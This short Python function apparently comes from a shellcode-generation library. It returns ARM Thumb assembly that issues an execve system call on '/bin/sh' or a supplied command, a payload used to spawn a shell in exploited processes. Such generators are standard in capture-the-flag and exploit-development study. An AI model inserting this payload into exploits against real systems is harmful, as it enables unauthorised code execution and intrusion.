# /bin/sh
def generate(cmd='/bin/sh'):
    sc = """
    mov r0, pc
    add r0, #10
    movs r2, #0
    movs r7, #(0+ 11)
    push {r0, r2}
    mov r1, sp
    svc 1
bin_sh_1:
    .asciz "%s\x00"
    """ % (cmd)
    return sc
